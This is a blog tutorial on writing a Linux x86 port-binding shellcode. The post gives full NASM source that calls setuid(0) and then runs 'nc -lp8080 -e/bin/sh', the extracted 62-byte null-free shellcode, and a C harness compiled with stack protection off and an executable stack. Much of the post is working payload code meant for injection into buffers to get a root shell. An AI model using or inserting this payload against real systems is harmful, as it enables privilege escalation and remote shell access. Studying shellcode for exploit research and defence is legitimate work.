---
layout: post
date:   2017-04-14 15:12:01 -0600
categories: exploit
description: "Introduction to the arcane art of shellcode writing."
title:  "Writing a port binding shellcode for Linux"
---

## Introduction

A few weeks ago I wrote my first shellcode, so I'm definately not an expert in shellcode writing, but I want to write down and explain what I've learned.
I think that the best way to see if you really understand something is to try and teach it to someone.

This post is heavily influenced by these two tutorials and I highly recommend to check them out:
1. [Demystifying the execve shellcode (Stack Method)](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html) at hackoftheday.securitytube.net
2. [Writing my first shellcode - iptables -P INPUT ACCEPT](https://0day.work/writing-my-first-shellcode-iptables-p-input-accept/)  at 0day.work

The shellcode in this tutorial is a port binding shellcode for *x86 32bit architecture**{: style="color: LightSalmon"}. It runs the command  
*nc -lp8080 -e/bin/sh*{: style="color: LightGreen"}, which creates a listening socket,
binds it to port 8080 and starts a shell with its input and output redirected via the network socket. There are different versions of netcat
and some of them don't have the *-e*{: style="color: LightGreen"} switch, so this shellcode won't work on every system. 

I'll make use of *setuid*{: style="color: LightGreen"} and *execve*{: style="color: LightGreen"} system calls. When an executable file in 
linux has the *setuid*{: style="color: LightGreen"} bit set (chmod u+s or chmod 4xxx)
it can be executed with the privileges of the file owner. For this to happen the program must make use of the *setuid*{: style="color: LightGreen"} system call, otherwise
it would still be executed as the user that started it. If the owner is root we'll gain a root shell. The *execve*{: style="color: LightGreen"} syscall executes a program.

To call a system call in assembly, the arguments for the syscall are stored in the registers. Also arrays and strings need to be null terminated.  

### The execve system call:
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```
*filename*{: style="color: LightGreen"} - pointer to a string that contains the path of the executable.  
*argv[]*{: style="color: LightGreen"} - pointer to an array that contains the arguments of the program. 
The first argument (*argv[0]*{: style="color: LightGreen"}) must be equal to *filename*{: style="color: LightGreen"}.   
*envp[]*{: style="color: LightGreen"} - pointer to an array containing additinal environment options. Won't be used here.

These pointers will be stored in the registers prior to calling the syscall.  
*eax*{: style="color: LightGreen"} will store the *syscall number*{: style="color: LightGreen"}  
*ebx*{: style="color: LightGreen"} will store pointer to the first argument (*filename*{: style="color: LightGreen"})  
*ecx*{: style="color: LightGreen"} will store pointer to the second argument (*argv[]*{: style="color: LightGreen"})   
*edx*{: style="color: LightGreen"} will store pointer to the third argument (*envp[]*{: style="color: LightGreen"})  

For this example the arguments have the following values:  
*filename*{: style="color: LightGreen"} = '/bin/nc'  
*argv[]*{: style="color: LightGreen"} = ['/bin/nc', '-lp8080', '-e/bin/sh']  
*envp[]*{: style="color: LightGreen"} = 0  

### The setuid system call:
```c
int setuid(uid_t uid);
```

*eax*{: style="color: LightGreen"} will store the *syscall number*{: style="color: LightGreen"}  
*ebx*{: style="color: LightGreen"} will store the *uid*{: style="color: LightGreen"}  

The user id of root is zero:  
*uid*{: style="color: LightGreen"} = 0  

### Pushing strings on the stack

The stack grows from high memory addresses to low memory addresses and Intel CPUs are little endian, so effectively the strings are stored onto the stack in reverse (the most significat byte is at a lower address and the least significat - at higher address). This means that the 
bytes of a string must be pushed in reversed order.

## Writing the shellcode
Shellcode writing consists of three steps:
1. Write the program in assembly
2. Disassemble it
3. Extract the opcodes and that's your shellcode

As you probably know the shellcode shouldn't contain null bytes. The null byte is used for string terminaton and you'd probably want to inject
your shellcode in a buffer.

First lets write the *setuid*{: style="color: LightGreen"} syscall. Its system call number is 23 (0x17 in hex). It takes as an argument
*uid*{: style="color: LightGreen"} = 0, stored in *ebx*{: style="color: LightGreen"} register, but since we aren't allowed to use 
null bytes in the code we'll make use of the xor instruction.

```nasm
section .text  ; defines code section

global _start  

_start:         ; entry point
  xor ebx, ebx      ; XOR ebx with itself. The result is 0 and stored in ebx.
  push byte 0x17
  pop eax           ; Load number 0x17 (setuid) in eax
  int 0x80          ; call setuid(0)
```

For the *execve*{: style="color: LightGreen"} system call the arguments must be pushed onto the stack and their addresses loaded in the
registers.   
*ebx*{: style="color: LightGreen"} -> *filename*{: style="color: LightGreen"} = '/bin/nc'   
*ecx*{: style="color: LightGreen"} -> *argv[]*{: style="color: LightGreen"} = ['/bin/nc', '-lp8080', '-e/bin/sh']  
*edx*{: style="color: LightGreen"} -> *envp[]*{: style="color: LightGreen"} = 0  

First the strings should be reversed. You could use python for this. Lets take for 
example the first argument *'/bin/nc'*{: style="color: LightSalmon"}

```python
>>> '/bin/nc'[::-1]
'cn/nib/'
```

Then convert them to hex and push by groups of four bytes.  
cn/nib/

```python
>>> 'nib/'.encode('hex')
'6e69622f'
>>> 'cn/'.encode('hex')
'636e2f'
```

ascii: *cn/*{: style="color: LightSalmon"}   -> hex: *0x00636e2f*{: style="color: LightSalmon"} Has a null byte!  
ascii: *nib/*{: style="color: LightSalmon"}  -> hex: *0x6e69622f*{: style="color: LightSalmon"}  

When the string length isn't a multiple of four bytes, there are few ways to avoid adding a null byte. I'll show only two, but
you could check [0day.work](https://0day.work/writing-my-first-shellcode-iptables-p-input-accept/) and see another one that uses
the *shr*{: style="color: LightGreen"} (shift right) instruction.

One way is to add another slash in the path, so */bin/nc*{: style="color: LightSalmon"} becomes */bin//nc*{: style="color: LightSalmon"} 
or *//bin/nc*{: style="color: LightSalmon"}. Multiple */*{: style="color: LightSalmon"} don't cause problems in linux and 
the path will be read correctly.

ascii: *cn//*{: style="color: LightSalmon"}  -> hex: *0x636e2f2f*{: style="color: LightSalmon"}  
ascii: *nib/*{: style="color: LightSalmon"}  -> hex: *0x6e69622f*{: style="color: LightSalmon"} 

Another way is using the instruction *push byte*{: style="color: LightGreen"} to push one byte, *push word*{: style="color: LightGreen"}
to push two bytes. Then the string will be divided as:

ascii: *c*{: style="color: LightSalmon"}     -> hex: *0x63*{: style="color: LightSalmon"}  
ascii: *n/*{: style="color: LightSalmon"}    -> hex: *0x6e2f*{: style="color: LightSalmon"}  
ascii: *nib/*{: style="color: LightSalmon"}  -> hex: *0x6e69622f*{: style="color: LightSalmon"}  

```nasm
  xor edx, edx      ; Use edx as null byte
  
  push edx          ; null termination for '/bin//nc'
  push 0x636e2f2f   ; cn//
  push 0x6e69622f   ; nib/
  mov ebx, esp      ; Now ebx points to the '/bin//nc' string
```

The second argument *-lp8080*{: style="color: LightSalmon"} also isn't a multiple of four bytes. We can't use slashes here so we'll use the second method.

```python
>>> '-lp8080'[::-1]
'0808pl-'
```

ascii: *0*{: style="color: LightSalmon"}     -> hex: *0x30*{: style="color: LightSalmon"}  
ascii: *80*{: style="color: LightSalmon"}    -> hex: *0x3830*{: style="color: LightSalmon"}  
ascii: *8pl-*{: style="color: LightSalmon"}  -> hex: *0x38706c2d*{: style="color: LightSalmon"}  

```nasm
  push edx          ; null termination for '-lp8080'
  push byte 0x30    ; 0
  push word 0x3830  ; 80
  push 0x38706c2d   ; 8pl-
  mov eax, esp      ; Now eax points to the '-lp8080' string
```

And do it again with the third argument.
```nasm
  push edx          ; null termination for '-e/bin/sh'
  push byte 0x68    ; h
  push 0x732f6e69   ; s/ni
  push 0x622f652d   ; b/e-
  mov ecx, esp      ; Now ecx points to the '-e/bin/sh' string
```

Now we need to construct the array of those arguments. Remember that it also has to be null terminated!
```nasm
  push edx  ; null termination for the array ['/bin//nc', '-lp8080', '-e/bin/sh']
  push ecx  ; points to '-e/bin/sh'
  push eax  ; points to '-lp8080'
  push ebx  ; points to '/bin//nc'
  mov ecx, esp ; Now ecx points to the beginning of the array ['/bin//nc', '-lp8080', '-e/bin/sh']
```

The stack should look like this:
![stack](/images/stack.png)

So *ebx*{: style="color: LightGreen"} already points to the *filename*{: style="color: LightGreen"} */bin//nc*{: style="color: LightSalmon"},
*ecx*{: style="color: LightGreen"} points to the array with the arguments and *edx*{: style="color: LightGreen"} is null, 
ready to be used as *envp[]*{: style="color: LightGreen"}. The only thing left is to load the *execve*{: style="color: LightGreen"} system call number
in *eax*{: style="color: LightGreen"} and execute the syscall.

```nasm
  push 0xb  ; 11 (0xb) is the syscall number of execve
  pop eax   ; load 0xb in eax
  int 0x80  ; call execve('/bin//nc', ['/bin//nc', '-lp8080', '-e/bin/sh'], 0)
```

And the whole assemby code:
```nasm
section .text  ; defines code section

global _start  

_start:         ; entry point
  xor ebx, ebx      ; XOR ebx with itself. The result is 0 and stored in ebx.
  push byte 0x17
  pop eax           ; Load number 0x17 (setuid) in eax
  int 0x80          ; call setuid(0)
  
  xor edx, edx      ; Use edx as null byte
  
  push edx          ; null termination for '/bin//nc'
  push 0x636e2f2f   ; cn//
  push 0x6e69622f   ; nib/
  mov ebx, esp      ; Now ebx points to the '/bin//nc' string
  
  push edx          ; null termination for '-lp8080'
  push byte 0x30    ; 0
  push word 0x3830  ; 80
  push 0x38706c2d   ; 8pl-
  mov eax, esp      ; Now eax points to the '-lp8080' string
  
  push edx          ; null termination for '-e/bin/sh'
  push byte 0x68    ; h
  push 0x732f6e69   ; s/ni
  push 0x622f652d   ; b/e-
  mov ecx, esp      ; Now ecx points to the '-e/bin/sh' string
  
  push edx  ; null termination for the array ['/bin//nc', '-lp8080', '-e/bin/sh']
  push ecx  ; points to '-e/bin/sh'
  push eax  ; points to '-lp8080'
  push ebx  ; points to '/bin//nc'
  mov ecx, esp ; Now ecx points to the beginning of the array ['/bin//nc', '-lp8080', '-e/bin/sh']
  
  push 0xb  ; 11 (0xb) is the syscall number of execve
  pop eax   ; load 0xb in eax
  int 0x80  ; call execve('/bin//nc', ['/bin//nc', '-lp8080', '-e/bin/sh'], 0)
```
## Testing time
Save the file and compile it. I saved mine as *shellcode-c137.asm*{: style="color: LightGreen"}
```bash
root@kali:~# nasm -f elf  shellcode-c137.asm
root@kali:~# ld -m elf_i386 -s -o shellcode-c137 shellcode-c137.o
```
This is a x86 assembly and to compile it on 64bit machine you should use the *-m elf_i386*{: style="color: LightGreen"} switch.

I'm using Kali Linux so I'm already root. To test the shellcode I've set the setuid bit of the file and started it from a non-privileged user,
that I created.

![shellcode-c137-test1](/images/shellcode-c137-test1.png)

No errors. That's a good sign. Also notice the setuid bit. Let's see if it's listening on port 8080.

![shellcode-c137-test2](/images/shellcode-c137-test2.png)

Now let's use netcat and connect to it.

![shellcode-c137-test3](/images/shellcode-c137-test3.png)

Yay, it works! We've got a root shell!

Let's disassemble the executable and examine the opcodes.

```bash
root@kali:~# objdump -M intel -d shellcode-c137
```

![shellcode-c137-test4](/images/shellcode-c137-test4.png)

There are no null bytes. What's left is to extract the opcodes. You could do this by hand or use the following one-liner
(I took it from [0day.work](https://0day.work/writing-my-first-shellcode-iptables-p-input-accept/)):

```bash
root@kali:~# for i in `objdump -d shellcode-c137 | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
```

And the resulting shellcode is:
```
\x31\xdb\x6a\x17\x58\xcd\x80\x31\xd2\x52
\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e
\x89\xe3\x52\x6a\x30\x66\x68\x30\x38\x68
\x2d\x6c\x70\x38\x89\xe0\x52\x6a\x68\x68
\x69\x6e\x2f\x73\x68\x2d\x65\x2f\x62\x89
\xe1\x52\x51\x50\x53\x89\xe1\x6a\x0b\x58
\xcd\x80
```

```python
>>> len('\x31\xdb\x6a\x17\x58\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x6a\x30\x66\x68\x30\x38\x68\x2d\x6c\x70\x38\x89\xe0\x52\x6a\x68\x68\x69\x6e\x2f\x73\x68\x2d\x65\x2f\x62\x89\xe1\x52\x51\x50\x53\x89\xe1\x6a\x0b\x58\xcd\x80')
62
```

The length of the shellcode is 62 bytes.

## The end of the journey

What's left is to package it in a C program. 

```c
/*
Shellcode: Linux/x86 - setuid(0) & execve("/bin/nc", ["/bin/nc", "-lp8080", "-e/bin/sh"], NULL) - 62 bytes
Written by: Iliya Dafchev
Date: 15 April 2017

section .text  ; defines code section

global _start  

_start:         ; entry point
  xor ebx, ebx      ; XOR ebx with itself. The result is 0 and stored in ebx.
  push byte 0x17
  pop eax           ; Load number 0x17 (setuid) in eax
  int 0x80          ; call setuid(0)
  
  xor edx, edx      ; Use edx as null byte
  
  push edx          ; null termination for '/bin//nc'
  push 0x636e2f2f   ; cn//
  push 0x6e69622f   ; nib/
  mov ebx, esp      ; Now ebx points to the '/bin//nc' string
  
  push edx          ; null termination for '-lp8080'
  push byte 0x30    ; 0
  push word 0x3830  ; 80
  push 0x38706c2d   ; 8pl-
  mov eax, esp      ; Now eax points to the '-lp8080' string
  
  push edx          ; null termination for '-e/bin/sh'
  push byte 0x68    ; h
  push 0x732f6e69   ; s/ni
  push 0x622f652d   ; b/e-
  mov ecx, esp      ; Now ecx points to the '-e/bin/sh' string
  
  push edx  ; null termination for the array ['/bin//nc', '-lp8080', '-e/bin/sh']
  push ecx  ; points to '-e/bin/sh'
  push eax  ; points to '-lp8080'
  push ebx  ; points to '/bin//nc'
  mov ecx, esp ; Now ecx points to the beginning of the array ['/bin//nc', '-lp8080', '-e/bin/sh']
  
  push 0xb  ; 11 (0xb) is the syscall number of execve
  pop eax   ; load 0xb in eax
  int 0x80  ; call execve('/bin//nc', ['/bin//nc', '-lp8080', '-e/bin/sh'], 0)
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =    "\x31\xdb\x6a\x17\x58\xcd\x80\x31\xd2\x52"
                                "\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e"
                                "\x89\xe3\x52\x6a\x30\x66\x68\x30\x38\x68"
                                "\x2d\x6c\x70\x38\x89\xe0\x52\x6a\x68\x68"
                                "\x69\x6e\x2f\x73\x68\x2d\x65\x2f\x62\x89"
                                "\xe1\x52\x51\x50\x53\x89\xe1\x6a\x0b\x58"
                                "\xcd\x80";

int main()  {
    printf("Length: %d bytes.\n", strlen(shellcode));
    (*(void(*)()) shellcode)();

    return 0;
} 
```

Compile with *-z execstack*{: style="color: LightGreen"} to make the stack executable,
and *-fno-stack-protector*{: style="color: LightGreen"} to disable the stack protection.
```shell
root@kali:~# gcc -m32 -fno-stack-protector -z execstack -o shellcode-c137 shellcode-c137.c 
```

Bravo! Now go and show it to your family and friends! 
